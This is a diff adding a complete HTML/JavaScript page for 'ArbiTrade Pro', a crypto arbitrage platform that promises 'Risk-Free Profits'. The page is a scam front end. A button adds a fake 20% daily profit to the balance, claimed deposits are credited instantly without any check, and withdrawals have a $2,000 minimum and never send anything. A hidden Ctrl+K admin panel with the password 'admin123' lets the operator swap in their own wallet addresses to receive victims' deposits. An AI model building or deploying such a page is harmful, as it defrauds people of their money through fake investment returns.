@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ArbiTrade Pro - Crypto Arbitrage</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
+  <style>
+    body { font-family: 'Inter', system-ui, sans-serif; }
+    .glass { background: rgba(255,255,255,0.05); backdrop-filter: blur(12px); }
+  </style>
+</head>
+<body class="bg-zinc-950 text-white min-h-screen">
+
+  <!-- LANDING PAGE -->
+  <div id="landing" class="min-h-screen">
+    <nav class="fixed top-0 w-full z-50 bg-black/80 backdrop-blur-md border-b border-white/10">
+      <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+        <div class="flex items-center gap-2 text-2xl font-bold">
+          <span class="text-emerald-500">A</span>ArbiTrade Pro
+        </div>
+        <button onclick="login()" class="bg-white text-black px-6 py-2 rounded-xl font-semibold hover:bg-white/90">
+          Login
+        </button>
+      </div>
+    </nav>
+
+    <div class="min-h-screen flex items-center justify-center pt-20 bg-gradient-to-br from-zinc-950 via-blue-950 to-zinc-950">
+      <div class="max-w-md mx-auto text-center px-6">
+        <h1 class="text-6xl font-bold mb-6">Risk-Free Profits</h1>
+        <p class="text-2xl text-zinc-400 mb-10">Automated Crypto Arbitrage</p>
+        
+        <div class="glass border border-white/10 rounded-3xl p-8">
+          <h2 class="text-3xl font-semibold mb-6">Create Free Account</h2>
+          <input type="email" id="email" placeholder="Email" class="w-full mb-4 px-6 py-4 bg-zinc-900 border border-white/10 rounded-2xl"/>
+          <input type="password" id="password" placeholder="Password" class="w-full mb-6 px-6 py-4 bg-zinc-900 border border-white/10 rounded-2xl"/>
+          <button onclick="createAccount()" class="w-full bg-emerald-500 py-4 rounded-2xl font-semibold">Create Account</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- USER DASHBOARD -->
+  <div id="dashboard" class="hidden min-h-screen bg-zinc-950">
+    <nav class="bg-zinc-900 border-b border-white/10 p-4">
+      <div class="max-w-7xl mx-auto flex justify-between items-center">
+        <div class="flex items-center gap-3">
+          <span class="text-2xl font-bold text-emerald-500">A</span>
+          <span class="font-semibold text-xl">ArbiTrade Pro</span>
+        </div>
+        <div class="flex items-center gap-6">
+          <button onclick="applyDailyProfit()" class="text-emerald-400 hover:text-emerald-500 flex items-center gap-2">
+            <i class="fas fa-chart-line"></i> Apply 20% Daily Profit
+          </button>
+          <div class="text-right">
+            <p class="text-xs text-zinc-400">Balance</p>
+            <p id="nav-balance" class="font-bold">$24,892.45</p>
+          </div>
+        </div>
+      </div>
+    </nav>
+
+    <div class="max-w-6xl mx-auto p-6">
+      <h1 class="text-4xl font-bold">Welcome back, Alex</h1>
+
+      <div class="mt-8 bg-gradient-to-r from-zinc-900 to-zinc-800 border border-emerald-500/30 rounded-3xl p-10">
+        <p class="text-zinc-400">Total Balance</p>
+        <p id="main-balance" class="text-7xl font-bold">$24,892.45</p>
+      </div>
+
+      <div class="flex gap-4 mt-10 border-b border-white/10">
+        <button onclick="switchTab(0)" class="tab-btn active px-6 py-3">Dashboard</button>
+        <button onclick="switchTab(1)" class="tab-btn px-6 py-3">Deposit</button>
+        <button onclick="switchTab(2)" class="tab-btn px-6 py-3">Withdraw</button>
+      </div>
+
+      <!-- Deposit Tab - Multiple Cryptos -->
+      <div id="tab-1" class="tab-content hidden mt-8">
+        <div class="glass border border-white/10 rounded-3xl p-8 max-w-lg">
+          <h2 class="text-2xl font-semibold mb-6">Deposit Funds</h2>
+          <p class="text-emerald-400 mb-6">Minimum Deposit: <b>$300</b></p>
+
+          <!-- Coin Selector -->
+          <div class="grid grid-cols-4 gap-3 mb-6">
+            <div onclick="selectCoin(0)" class="coin-btn active flex flex-col items-center p-3 rounded-2xl border-2 border-emerald-500 cursor-pointer">
+              <span class="text-2xl">₮</span><span class="text-xs">USDT</span>
+            </div>
+            <div onclick="selectCoin(1)" class="coin-btn flex flex-col items-center p-3 rounded-2xl border border-white/20 hover:border-white/40 cursor-pointer">
+              <span class="text-2xl">₿</span><span class="text-xs">BTC</span>
+            </div>
+            <div onclick="selectCoin(2)" class="coin-btn flex flex-col items-center p-3 rounded-2xl border border-white/20 hover:border-white/40 cursor-pointer">
+              <span class="text-2xl">Ξ</span><span class="text-xs">ETH</span>
+            </div>
+            <div onclick="selectCoin(3)" class="coin-btn flex flex-col items-center p-3 rounded-2xl border border-white/20 hover:border-white/40 cursor-pointer">
+              <span class="text-2xl">◎</span><span class="text-xs">SOL</span>
+            </div>
+          </div>
+
+          <div class="mb-6">
+            <p class="text-sm text-zinc-400 mb-2" id="selected-network">TRC20 Network</p>
+            <div id="deposit-address-display" class="bg-zinc-900 p-4 rounded-2xl font-mono text-sm break-all border border-emerald-500/30">
+              TR7xK9pQ2mL8vN3fR5tY7uI9oP4sD6fG8hJ
+            </div>
+            <button onclick="copyDepositAddress()" class="mt-3 w-full bg-white text-black py-3 rounded-2xl font-semibold">Copy Address</button>
+          </div>
+
+          <input type="number" id="deposit-amount" placeholder="Enter amount (min $300)" class="w-full bg-zinc-900 border border-white/10 rounded-2xl px-6 py-4 text-2xl mb-6"/>
+          <button onclick="makeDeposit()" class="w-full bg-emerald-500 py-5 rounded-2xl text-xl font-semibold">I Have Sent Deposit</button>
+        </div>
+      </div>
+
+      <!-- Withdraw Tab -->
+      <div id="tab-2" class="tab-content hidden mt-8">
+        <div class="glass border border-white/10 rounded-3xl p-8 max-w-lg">
+          <h2 class="text-2xl font-semibold mb-2">Withdraw Funds</h2>
+          <p class="text-orange-400 mb-6">Minimum Withdrawal: <b>$2,000</b></p>
+          <input type="number" id="withdraw-amount" placeholder="Amount" class="w-full bg-zinc-900 border border-white/10 rounded-2xl px-6 py-4 text-2xl mb-4"/>
+          <input type="text" id="withdraw-address" placeholder="Your Wallet Address" class="w-full bg-zinc-900 border border-white/10 rounded-2xl px-6 py-4"/>
+          <button onclick="makeWithdraw()" class="mt-6 w-full bg-red-600 py-5 rounded-2xl text-xl">Withdraw Now</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ADMIN PANEL (Ctrl + K) -->
+  <div id="admin-panel" class="hidden min-h-screen bg-zinc-950">
+    <div class="p-6 bg-zinc-900 border-b flex justify-between">
+      <h1 class="text-3xl font-bold">🔒 Admin Panel</h1>
+      <button onclick="logoutAdmin()" class="bg-red-600 px-6 py-2 rounded-xl">Logout</button>
+    </div>
+
+    <div class="max-w-7xl mx-auto p-6">
+      <h2 class="text-xl font-semibold mb-6">Your Deposit Addresses</h2>
+      <div id="admin-addresses" class="space-y-6"></div>
+    </div>
+  </div>
+
+  <script>
+    let depositAddresses = {
+      0: { coin: "USDT", network: "TRC20", address: "TR7xK9pQ2mL8vN3fR5tY7uI9oP4sD6fG8hJ" },
+      1: { coin: "BTC",  network: "Bitcoin", address: "bc1qxy2kdyk4x5f3p2v8z9x7y6t5r4e3w2q1z9x8v7" },
+      2: { coin: "ETH",  network: "ERC20", address: "0x742d35Cc6634C0532925a3b8D8f8b9fD8f8b9fD8" },
+      3: { coin: "SOL",  network: "Solana", address: "9x7v8n3m2k4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e" }
+    };
+
+    let currentCoin = 0;
+    let currentUser = { deposit: 3000, balance: 24892.45 };
+
+    function selectCoin(index) {
+      currentCoin = index;
+      document.querySelectorAll('.coin-btn').forEach((btn, i) => {
+        btn.classList.toggle('active', i === index);
+        btn.classList.toggle('border-emerald-500', i === index);
+      });
+      updateDepositDisplay();
+    }
+
+    function updateDepositDisplay() {
+      const data = depositAddresses[currentCoin];
+      document.getElementById('selected-network').textContent = data.network + " Network";
+      document.getElementById('deposit-address-display').textContent = data.address;
+    }
+
+    function copyDepositAddress() {
+      const addr = depositAddresses[currentCoin].address;
+      navigator.clipboard.writeText(addr);
+      alert("✅ " + depositAddresses[currentCoin].coin + " address copied!");
+    }
+
+    function makeDeposit() {
+      const amount = parseFloat(document.getElementById('deposit-amount').value);
+      if (!amount || amount < 300) return alert("❌ Minimum deposit is $300");
+
+      currentUser.balance += amount;
+      currentUser.deposit += amount;
+
+      document.getElementById('main-balance').textContent = '$' + currentUser.balance.toLocaleString();
+      document.getElementById('nav-balance').textContent = '$' + currentUser.balance.toLocaleString();
+
+      alert(`✅ $${amount} ${depositAddresses[currentCoin].coin} deposit received!\nBalance updated immediately.`);
+      document.getElementById('deposit-amount').value = '';
+      switchTab(0);
+    }
+
+    // Admin Functions
+    document.addEventListener('keydown', function(e) {
+      if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+        e.preventDefault();
+        const pass = prompt("🔒 Enter Admin Password:");
+        if (pass === "admin123") showAdminPanel();
+        else if (pass) alert("❌ Wrong password");
+      }
+    });
+
+    function showAdminPanel() {
+      document.getElementById('landing').classList.add('hidden');
+      document.getElementById('dashboard').classList.add('hidden');
+      document.getElementById('admin-panel').classList.remove('hidden');
+      renderAdminAddresses();
+    }
+
+    function renderAdminAddresses() {
+      let html = '';
+      Object.keys(depositAddresses).forEach(key => {
+        const d = depositAddresses[key];
+        html += `
+          <div class="glass p-6 rounded-3xl">
+            <h3 class="font-semibold text-lg">${d.coin} (${d.network})</h3>
+            <input type="text" id="addr-${key}" value="${d.address}" 
+                   class="w-full mt-3 bg-zinc-900 border border-white/10 rounded-2xl px-6 py-4 font-mono text-sm"/>
+          </div>`;
+      });
+      document.getElementById('admin-addresses').innerHTML = html;
+    }
+
+    function saveAdminAddresses() {
+      Object.keys(depositAddresses).forEach(key => {
+        const input = document.getElementById(`addr-${key}`);
+        if (input) depositAddresses[key].address = input.value.trim();
+      });
+      alert("✅ All deposit addresses saved!");
+      updateDepositDisplay();
+    }
+
+    // Other functions (applyDailyProfit, makeWithdraw, switchTab, etc.)
+    function applyDailyProfit() {
+      currentUser.balance = Math.round(currentUser.balance * 1.20);
+      document.getElementById('main-balance').textContent = '$' + currentUser.balance.toLocaleString();
+      document.getElementById('nav-balance').textContent = '$' + currentUser.balance.toLocaleString();
+      alert("✅ 20% Daily Profit Applied!");
+    }
+
+    function makeWithdraw() {
+      const amount = parseFloat(document.getElementById('withdraw-amount').value);
+      if (!amount || amount < 2000) return alert("Minimum withdrawal is $2,000");
+      if (amount > currentUser.balance) return alert("Insufficient balance");
+
+      currentUser.balance -= amount;
+      document.getElementById('main-balance').textContent = '$' + currentUser.balance.toLocaleString();
+      document.getElementById('nav-balance').textContent = '$' + currentUser.balance.toLocaleString();
+      alert("✅ Withdrawal request submitted!");
+      document.getElementById('withdraw-amount').value = '';
+      document.getElementById('withdraw-address').value = '';
+      switchTab(0);
+    }
+
+    function switchTab(n) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+      if (document.getElementById('tab-' + n)) document.getElementById('tab-' + n).classList.remove('hidden');
+      
+      document.querySelectorAll('.tab-btn').forEach((el, i) => {
+        el.classList.toggle('active', i === n);
+        el.classList.toggle('border-emerald-500', i === n);
+        el.classList.toggle('text-emerald-400', i === n);
+      });
+    }
+
+    function createAccount() {
+      alert("✅ Account created successfully!");
+      document.getElementById('landing').classList.add('hidden');
+      document.getElementById('dashboard').classList.remove('hidden');
+    }
+
+    function login() {
+      document.getElementById('landing').classList.add('hidden');
+      document.getElementById('dashboard').classList.remove('hidden');
+      updateDepositDisplay();
+    }
+
+    function logoutAdmin() {
+      document.getElementById('admin-panel').classList.add('hidden');
+      document.getElementById('landing').classList.remove('hidden');
+    }
+
+    window.onload = () => {
+      switchTab(0);
+    };
+  </script>
+</body>
+</html>
